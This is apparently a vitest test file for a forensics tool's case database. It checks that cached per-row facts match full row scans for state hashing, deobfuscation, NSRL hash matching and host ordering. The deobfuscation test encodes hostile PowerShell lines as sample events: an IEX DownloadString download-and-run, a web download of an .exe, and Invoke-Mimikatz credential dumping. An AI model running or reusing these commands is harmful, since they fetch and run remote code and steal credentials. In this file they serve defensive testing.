import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { createHash } from "node:crypto";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { emptyState, type ForensicEvent, type InvestigationState } from "../../src/analysis/stateTypes.js";
import { canonicalize } from "../../src/analysis/analysisRunHash.js";
import {
  investigationOutput,
  investigationOutputOfCase,
  STATE_HASH_ID,
} from "../../src/analysis/analysisRunSnapshot.js";
import { forensicFacts, refreshRowFacts, rowFactsStamp } from "../../src/analysis/rowFacts.js";
import { deobfuscateRows } from "../../src/composition/deobfuscationRows.js";
import { nsrlEventMatches } from "../../src/composition/nsrlRows.js";
import { scriptBlockSignal } from "../../src/analysis/tradecraftRules.js";
import { loadDatabaseSync } from "../../src/analysis/sqliteRuntime.js";
import { hostNamesFromAssets, hostNamesFromState } from "../../src/analysis/hostDuplicateGate.js";

// #1874: per-row facts kept in the case database, so the per-import passes stop reading every row.
// Each pass must give exactly what reading every row gave.

function ev(id: string, description: string, p: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: `2026-01-0${1 + (Number(id.replace(/\D/g, "")) % 9)}T00:00:00Z`,
    description,
    severity: "Medium",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

const psEnc = (plaintext: string): string =>
  `powershell.exe -NoProfile -enc ${Buffer.from(plaintext, "utf16le").toString("base64")}`;

let dir: string;
let store: StateStore;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "dfir-facts-"));
  const cases = new CaseStore(dir);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  await cases.createCase({ caseId: "c2", name: "n", investigator: "i", aiProvider: null });
  store = new StateStore(cases);
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

// The store as a caller without row facts sees it: every pass takes its read-every-row path.
function withoutFacts(s: StateStore): StateStore {
  return new Proxy(s, {
    get(target, prop) {
      if (prop === "factsPending") return undefined;
      const value = Reflect.get(target, prop, target) as unknown;
      return typeof value === "function" ? (value as (...a: unknown[]) => unknown).bind(target) : value;
    },
  });
}

// The store with nothing ever refreshed: every row's facts are unknown to the readers.
function neverRefreshed(s: StateStore): StateStore {
  return new Proxy(s, {
    get(target, prop) {
      if (prop === "factsPending") return async () => [];
      const value = Reflect.get(target, prop, target) as unknown;
      return typeof value === "function" ? (value as (...a: unknown[]) => unknown).bind(target) : value;
    },
  });
}

const seeded = (): InvestigationState => ({
  ...emptyState("c1"),
  findings: [{ id: "f1", title: "t", severity: "High", description: "d", relatedEventIds: ["e2"] } as never],
  iocs: [
    { id: "i001", type: "ip", value: "203.0.113.9", zeta: { b: 1, a: [2, { d: 1, c: 2 }] } } as never,
    { id: "i002", type: "domain", value: "a.example.com" } as never,
  ],
  forensicTimeline: Array.from({ length: 40 }, (_, i) =>
    ev(`e${i}`, `row ${i}`, { sha256: i % 7 ? undefined : "AB".repeat(32), asset: "H1" }),
  ),
});

const hex = (text: string): string => createHash("sha256").update(text).digest("hex");

describe("the run record's state hash, investigation-state/v2 (#1874)", () => {
  it("is SHA-256 of the canonical {findings, per-event digests, per-IOC digests}", async () => {
    await store.save(seeded());
    const state = await store.load("c1");
    const digest = (v: unknown): string => hex(JSON.stringify(canonicalize(v)));
    const expected = hex(
      JSON.stringify(
        canonicalize({
          findings: state.findings,
          forensicTimeline: state.forensicTimeline.map(digest),
          iocs: state.iocs.map(digest),
        }),
      ),
    );
    const out = investigationOutput(state);
    expect(out.hashes).toEqual([{ id: STATE_HASH_ID, sha256: expected }]);
    expect(out.entityIds).toEqual(["f1", "i001", "i002", ...state.forensicTimeline.map((e) => e.id)]);
  });

  it("changes with any event's content and with the timeline's order", () => {
    const base = { ...seeded(), forensicTimeline: seeded().forensicTimeline.slice(0, 3) };
    const h = (s: InvestigationState): string => investigationOutput(s).hashes[0].sha256;
    const edited = {
      ...base,
      forensicTimeline: base.forensicTimeline.map((e, i) =>
        i === 1 ? { ...e, severity: "High" as const } : e,
      ),
    };
    const swapped = {
      ...base,
      forensicTimeline: [base.forensicTimeline[1], base.forensicTimeline[0], base.forensicTimeline[2]],
    };
    const iocEdited = { ...base, iocs: [{ ...base.iocs[0], value: "203.0.113.10" }, base.iocs[1]] };
    expect(new Set([h(base), h(edited), h(swapped), h(iocEdited)]).size).toBe(4);
  });

  it("reads the same from the stored facts as from the whole case — fresh, stale and unknown rows", async () => {
    await store.save(seeded());
    // First record: every row is queued, refreshed, then read.
    expect(await investigationOutputOfCase(store, "c1")).toEqual(investigationOutput(await store.load("c1")));
    // Rows written since: two rewritten, one removed, one appended, IOCs changed.
    const rows = await store.forensicRowsById("c1", ["e3", "e9"]);
    await store.updateForensicRows(
      "c1",
      rows.map((r) => ({ ...r, event: { ...r.event, severity: "Critical" as const } })),
    );
    const [gone] = await store.forensicRowsById("c1", ["e5"]);
    await store.deleteForensicRows("c1", [gone.rowId]);
    await store.appendForensicEvents("c1", [ev("e99", "appended")]);
    const overview = await store.loadOverview("c1");
    await store.saveOverview({
      ...overview,
      iocs: [...overview.iocs, { id: "i003", type: "ip", value: "198.51.100.1" } as never],
    });
    // Unknown rows are digested from their payloads in the same read…
    expect(await investigationOutputOfCase(neverRefreshed(store), "c1")).toEqual(
      investigationOutput(await store.load("c1")),
    );
    // …and refreshed ones from the stored facts.
    expect(await investigationOutputOfCase(store, "c1")).toEqual(investigationOutput(await store.load("c1")));
  });

  it("is the empty case's output for a case with no state", async () => {
    expect(await investigationOutputOfCase(store, "c2")).toEqual(investigationOutput(emptyState("c2")));
  });
});

describe("row facts storage (#1874)", () => {
  it("queues inserted and rewritten rows, keeps facts across an ordinal-only move, cascades a delete", async () => {
    await store.save(seeded());
    const stamp = rowFactsStamp();
    expect(await refreshRowFacts(store, "c1")).toBe(42); // 40 events + 2 IOCs
    expect(await store.factsPending("c1", stamp, 100)).toEqual([]);
    // A save that only re-orders (an earlier event lands in front) writes no payload.
    const state = await store.load("c1");
    await store.save({
      ...state,
      forensicTimeline: [
        ev("e0x", "earlier", { timestamp: "2025-01-01T00:00:00Z" }),
        ...state.forensicTimeline,
      ],
    });
    const pending = await store.factsPending("c1", stamp, 100);
    expect(pending.map((p) => (p.payload as ForensicEvent).id)).toEqual(["e0x"]);
    await refreshRowFacts(store, "c1");
    const [row] = await store.forensicRowsById("c1", ["e4"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, description: "changed" } }]);
    const queued = await store.factsPending("c1", stamp, 100);
    expect(queued.map((p) => p.rowId)).toEqual([row.rowId]);
    await store.deleteForensicRows("c1", [row.rowId]);
    expect(await store.factsPending("c1", stamp, 100)).toEqual([]);
  });

  it("never stores facts computed from a payload written after it was read", async () => {
    await store.save(seeded());
    const stamp = rowFactsStamp();
    await refreshRowFacts(store, "c1");
    const [row] = await store.forensicRowsById("c1", ["e2"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, description: "first" } }]);
    const [read] = await store.factsPending("c1", stamp, 10);
    // A writer lands between the read and the write-back.
    const [again] = await store.forensicRowsById("c1", ["e2"]);
    await store.updateForensicRows("c1", [{ ...again, event: { ...again.event, description: "second" } }]);
    const written = await store.factsWrite("c1", stamp, [
      { ...forensicFacts(read.payload), rowId: read.rowId, seq: read.seq },
    ]);
    expect(written).toBe(0);
    const [still] = await store.factsPending("c1", stamp, 10);
    expect((still.payload as ForensicEvent).description).toBe("second");
  });

  it("trusts no fact under another stamp: every row is queued again", async () => {
    await store.save(seeded());
    await refreshRowFacts(store, "c1");
    expect(await store.factsPending("c1", "another-build", 1000)).toHaveLength(42);
    expect(await store.factsWrite("c1", rowFactsStamp(), [{ rowId: 1, seq: 0, id: "x", digest: "d" }])).toBe(
      0,
    );
  });

  it("queues a row that has no facts and is not queued (a cache miss)", async () => {
    await store.save(seeded());
    const stamp = rowFactsStamp();
    await refreshRowFacts(store, "c1");
    // Drop one row's facts behind the triggers' back: the next refresh must pick it up.
    const DatabaseSync = loadDatabaseSync();
    const db = new DatabaseSync(store.databasePath("c1"));
    db.exec("DELETE FROM row_facts WHERE row_id = (SELECT MIN(row_id) FROM row_facts)");
    db.close();
    expect(await store.factsPending("c1", stamp, 10)).toHaveLength(1);
  });
});

async function twin(state: InvestigationState): Promise<void> {
  await store.save(state);
  await store.save({ ...state, caseId: "c2" });
}

describe("deobfuscation sweep from row facts (#1874)", () => {
  it("decodes the same rows, numbers the same IOCs and writes the same rows as the read-every-row sweep", async () => {
    const opts = { gradeDerived: scriptBlockSignal };
    const start: InvestigationState = {
      ...emptyState("c1"),
      iocs: [{ id: "i001", type: "ip", value: "203.0.113.1" } as never],
      forensicTimeline: [
        ev("e1", psEnc("IEX (New-Object Net.WebClient).DownloadString('http://a.example.com/x')")),
        ev("e2", "svchost.exe started"),
        // A result from an older decoder: not re-decoded without re-analysis, by either path.
        ev("e3", psEnc("Invoke-WebRequest http://b.example.com/y"), {
          deobfuscated: { decoded: "old", method: "base64", iocs: ["i001"], version: 1 },
        }),
      ],
    };
    await twin(start);
    const facts = store;
    const scan = withoutFacts(store);
    const round = async (): Promise<void> => {
      const a = await deobfuscateRows(facts, "c1", opts);
      const b = await deobfuscateRows(scan, "c2", opts);
      expect(a).toEqual(b);
      const [x, y] = [await store.load("c1"), await store.load("c2")];
      expect(x.iocs).toEqual(y.iocs);
      expect(
        x.forensicTimeline.map(({ id, severity, mitreTechniques, deobfuscated }) => ({
          id,
          severity,
          mitreTechniques,
          deobfuscated: deobfuscated && { ...deobfuscated },
        })),
      ).toEqual(
        y.forensicTimeline.map(({ id, severity, mitreTechniques, deobfuscated }) => ({
          id,
          severity,
          mitreTechniques,
          deobfuscated: deobfuscated && { ...deobfuscated },
        })),
      );
    };
    await round();
    // New rows arrive in both; one row is rewritten to something decodable; the sweep runs again.
    for (const caseId of ["c1", "c2"]) {
      await store.appendForensicEvents(caseId, [
        ev("e4", psEnc("Invoke-WebRequest http://a.example.com/x -OutFile c:\\t.exe")),
        ev("e5", "plain"),
      ]);
      const [row] = await store.forensicRowsById(caseId, ["e2"]);
      await store.updateForensicRows(caseId, [
        { ...row, event: { ...row.event, description: psEnc("Invoke-Mimikatz -DumpCreds") } },
      ]);
    }
    await round();
    await round(); // nothing left: both report no change
  });
});

describe("NSRL event matches from row facts (#1874)", () => {
  it("matches the same rows in the same order as matching every row", async () => {
    const sha = "ab".repeat(32);
    const md5 = "CD".repeat(16);
    await store.save({
      ...emptyState("c1"),
      forensicTimeline: [
        ev("e1", "a", { sha256: sha.toUpperCase() }),
        ev("e2", "b", { md5 }),
        ev("e3", "c", { sha256: "ef".repeat(32) }),
        ev("e4", "d"),
        ev("e5", "e", { sha256: sha, md5 }),
      ],
    });
    const known = new Set([sha, md5.toLowerCase()]);
    const lookup = (h: string): boolean => known.has(h);
    const expected = await nsrlEventMatches(withoutFacts(store), "c1", lookup);
    expect(expected.map((m) => m.event.id)).toEqual(["e1", "e2", "e5"]);
    expect(await nsrlEventMatches(store, "c1", lookup)).toEqual(expected);
    // A row written since the facts were computed is matched as it is now.
    const [row] = await store.forensicRowsById("c1", ["e3"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, sha256: sha } }]);
    const now = await nsrlEventMatches(withoutFacts(store), "c1", lookup);
    expect(now.map((m) => m.event.id)).toEqual(["e1", "e2", "e3", "e5"]);
    expect(await nsrlEventMatches(neverRefreshed(store), "c1", lookup)).toEqual(now);
    expect(await nsrlEventMatches(store, "c1", lookup)).toEqual(now);
  });
});

describe("forensicHostsInOrder (#1874)", () => {
  it("gives the host names hostNamesFromState reads from every row, in the same order", async () => {
    const assets = [undefined, "  H2 ", "H1", "", "h1", "H2", "   ", "H3", "H1", " H1"];
    await store.save({
      ...emptyState("c1"),
      forensicTimeline: assets.map((asset, i) =>
        ev(`e${i}`, `row ${i}`, { timestamp: `2026-01-01T00:00:${String(i).padStart(2, "0")}Z`, asset }),
      ),
    });
    const fromRows = hostNamesFromState(await store.load("c1"));
    expect(fromRows).toEqual(["H2", "H1", "h1", "H3"]);
    expect(hostNamesFromAssets(await store.forensicHostsInOrder("c1"))).toEqual(fromRows);
    // A row whose host a targeted write changes moves with it.
    const [row] = await store.forensicRowsById("c1", ["e1"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, asset: "H9" } }]);
    const now = hostNamesFromState(await store.load("c1"));
    expect(now).toEqual(["H9", "H1", "h1", "H2", "H3"]);
    expect(hostNamesFromAssets(await store.forensicHostsInOrder("c1"))).toEqual(now);
  });
});
